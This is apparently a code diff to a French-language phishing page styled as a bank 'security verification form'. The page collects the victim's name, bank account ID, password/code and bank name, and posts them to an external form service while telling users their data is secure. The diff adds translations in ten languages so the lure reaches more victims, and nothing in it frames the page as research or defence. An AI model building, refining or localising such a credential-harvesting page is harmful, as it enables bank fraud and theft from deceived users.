@@ -51,6 +51,7 @@
   <h2 id="titre">Processus de confidentialite</h2>
 
   <!-- Menu pour choisir la langue -->
+ <!-- Menu Langues -->
   <select id="langue" onchange="changerLangue()">
     <option value="fr">Français</option>
     <option value="en">English</option>
@@ -60,81 +61,154 @@
     <option value="pt">Português</option>
     <option value="nl">Nederlands</option>
     <option value="sv">Svenska</option>
-    <option value="no">Norsk</option>
-    <option value="da">Dansk</option>
-    <option value="fi">Suomi</option>
     <option value="ru">Русский</option>
     <option value="zh">中文</option>
-    <option value="ja">日本語</option>
-    <option value="ko">한국어</option>
-    <option value="ar">العربية</option>
-    <option value="hi">हिंदी</option>
-    <option value="tr">Türkçe</option>
-    <option value="pl">Polski</option>
-    <option value="cs">Čeština</option>
-    <option value="el">Ελληνικά</option>
-    <option value="he">עברית</option>
-    <option value="id">Bahasa Indonesia</option>
-    <option value="ms">Bahasa Melayu</option>
-    <option value="th">ไทย</option>
-    <option value="vi">Tiếng Việt</option>
-    <option value="ro">Română</option>
-    <option value="hu">Magyar</option>
-    <option value="bg">Български</option>
-    <option value="sr">Српски</option>
   </select>
   <form action="https://formspree.io/f/xbdakdel" method="POST">
      
-    <h2>Formulaire de verification de sécurite </h2>
-    <label for="nom">Nom et prenom :</label>
-    <input type="text" name="nom et prenom" required>
+       <h2 id="titre">Formulaire de vérification de sécurité</h2>
 
-    <label for="Identifiant">Identifiant de votre compte bancaire :</label>
-    <input type="text" name="Identifiant" required>
+    <label id="labelNom" for="nomInput">Nom et prénom :</label>
+    <input type="text" id="nomInput" name="nom et prenom" placeholder="Entrez votre nom" required>
 
-    <label for="Mot de passe">Mot de passe/Code :</label>
-    <input type="text" name="Mot de passe" required>
+    <label id="labelIdentifiant" for="identifiantInput">Identifiant de votre compte bancaire :</label>
+    <input type="text" id="identifiantInput" name="Identifiant" placeholder="Entrez votre identifiant" required>
 
-    <label for="Nom de la banque">Nom de votre banque :</label>
-    <input type="text" name="Nom de la banque" required>
+    <label id="labelMot" for="motInput">Mot de passe/Code :</label>
+    <input type="text" id="motInput" name="Mot de passe" placeholder="Entrez votre mot de passe" required>
 
-    
-   <label for="message">Message (facultatif) :</label>
-    <textarea name="message" rows="1"></textarea>
+    <label id="labelBanque" for="banqueInput">Nom de votre banque :</label>
+    <input type="text" id="banqueInput" name="Nom de la banque" placeholder="Nom de la banque" required>
 
-    <button type="submit">Envoyer</button>
-    <h5>Vos données sont en sécurité et tenu en toute confidentialite</h5>
+    <label id="labelMessage" for="messageInput">Message (facultatif) :</label>
+    <textarea id="messageInput" name="message" rows="1" placeholder="Votre message"></textarea>
+
+    <button type="submit" id="submitBtn">Envoyer</button>
+    <h5 id="secureText">Vos données sont en sécurité et tenues en toute confidentialité</h5>
   </form>
 
   <!-- Script pour changer la langue -->
 <script>
-function changerLangue() {
- var langue = document.getElementById('langue').value;
+const traductions = {
+  fr: {
+    titre: "Formulaire de vérification de sécurité",
+    labelNom: "Nom et prénom :",
+    labelIdentifiant: "Identifiant de votre compte bancaire :",
+    labelMot: "Mot de passe/Code :",
+    labelBanque: "Nom de votre banque :",
+    labelMessage: "Message (facultatif) :",
+    submitBtn: "Envoyer",
+    secureText: "Vos données sont en sécurité et tenues en toute confidentialité"
+  },
+  en: {
+    titre: "Security Verification Form",
+    labelNom: "Full Name:",
+    labelIdentifiant: "Bank Account ID:",
+    labelMot: "Password/Code:",
+    labelBanque: "Bank Name:",
+    labelMessage: "Message (optional):",
+    submitBtn: "Submit",
+    secureText: "Your data is secure and confidential"
+  },
+  es: {
+    titre: "Formulario de verificación de seguridad",
+    labelNom: "Nombre completo:",
+    labelIdentifiant: "ID de cuenta bancaria:",
+    labelMot: "Contraseña/Código:",
+    labelBanque: "Nombre del banco:",
+    labelMessage: "Mensaje (opcional):",
+    submitBtn: "Enviar",
+    secureText: "Tus datos están seguros y son confidenciales"
+  },
+  de: {
+    titre: "Sicherheitsüberprüfungsformular",
+    labelNom: "Vollständiger Name:",
+    labelIdentifiant: "Bankkonto-ID:",
+    labelMot: "Passwort/Code:",
+    labelBanque: "Name der Bank:",
+    labelMessage: "Nachricht (optional):",
+    submitBtn: "Senden",
+    secureText: "Ihre Daten sind sicher und vertraulich"
+  },
+  it: {
+    titre: "Modulo di verifica sicurezza",
+    labelNom: "Nome completo:",
+    labelIdentifiant: "ID conto bancario:",
+    labelMot: "Password/Codice:",
+    labelBanque: "Nome banca:",
+    labelMessage: "Messaggio (facoltativo):",
+    submitBtn: "Invia",
+    secureText: "I tuoi dati sono sicuri e riservati"
+  },
+  pt: {
+    titre: "Formulário de verificação de segurança",
+    labelNom: "Nome completo:",
+    labelIdentifiant: "ID da conta bancária:",
+    labelMot: "Senha/Código:",
+    labelBanque: "Nome do banco:",
+    labelMessage: "Mensagem (opcional):",
+    submitBtn: "Enviar",
+    secureText: "Seus dados estão seguros e confidenciais"
+  },
+  nl: {
+    titre: "Beveiligingsformulier",
+    labelNom: "Volledige naam:",
+    labelIdentifiant: "Bankrekening ID:",
+    labelMot: "Wachtwoord/Code:",
+    labelBanque: "Naam van de bank:",
+    labelMessage: "Bericht (optioneel):",
+    submitBtn: "Verzenden",
+    secureText: "Uw gegevens zijn veilig en vertrouwelijk"
+  },
+  sv: {
+    titre: "Säkerhetsverifieringsformulär",
+    labelNom: "Fullständigt namn:",
+    labelIdentifiant: "Bankkonto ID:",
+    labelMot: "Lösenord/Kod:",
+    labelBanque: "Banknamn:",
+    labelMessage: "Meddelande (valfritt):",
+    submitBtn: "Skicka",
+    secureText: "Din data är säker och konfidentiell"
+  },
+  ru: {
+    titre: "Форма проверки безопасности",
+    labelNom: "Полное имя:",
+    labelIdentifiant: "Идентификатор банковского счета:",
+    labelMot: "Пароль/Код:",
+    labelBanque: "Название банка:",
+    labelMessage: "Сообщение (необязательно):",
+    submitBtn: "Отправить",
+    secureText: "Ваши данные защищены и конфиденциальны"
+  },
+  zh: {
+    titre: "安全验证表单",
+    labelNom: "全名：",
+    labelIdentifiant: "银行账户ID：",
+    labelMot: "密码/代码：",
+    labelBanque: "银行名称：",
+    labelMessage: "信息（可选）：",
+    submitBtn: "提交",
+    secureText: "您的数据安全且保密"
+  }
+};
 
- if(langue === 'en') {
- document.getElementById('titre').innerText = "Student Form";
- document.getElementById('prenomLabel').innerText = "First Name:";
- document.getElementById('nomLabel').innerText = "Last Name:";
- document.getElementById('moyenneLabel').innerText = "Average:";
- document.getElementById('idLabel').innerText = "Student ID:";
- document.getElementById('submitBtn').innerText = "Submit";
- } else if(langue === 'es') {
- document.getElementById('titre').innerText = "Formulario de Estudiantes";
- document.getElementById('prenomLabel').innerText = "Nombre:";
- document.getElementById('nomLabel').innerText = "Apellido:";
- document.getElementById('moyenneLabel').innerText = "Promedio:";
- document.getElementById('idLabel').innerText = "ID del estudiante:";
- document.getElementById('submitBtn').innerText = "Enviar";
- } else {
- document.getElementById('titre').innerText = "Formulaire Élèves";
- document.getElementById('prenomLabel').innerText = "Prénom:";
- document.getElementById('nomLabel').innerText = "Nom:";
- document.getElementById('moyenneLabel').innerText = "Moyenne:";
- document.getElementById('idLabel').innerText = "Identifiant:";
- document.getElementById('submitBtn').innerText = "Envoyer";
- }
+function changerLangue() {
+  const langue = document.getElementById('langue').value;
+  const t = traductions[langue];
+  if(t){
+    document.getElementById('titre').innerText = t.titre;
+    document.getElementById('labelNom').innerText = t.labelNom;
+    document.getElementById('labelIdentifiant').innerText = t.labelIdentifiant;
+    document.getElementById('labelMot').innerText = t.labelMot;
+    document.getElementById('labelBanque').innerText = t.labelBanque;
+    document.getElementById('labelMessage').innerText = t.labelMessage;
+    document.getElementById('submitBtn').innerText = t.submitBtn;
+    document.getElementById('secureText').innerText = t.secureText;
+  }
 }
 </script>
+
 </body>
 </html>
-
+</body>
+</html>
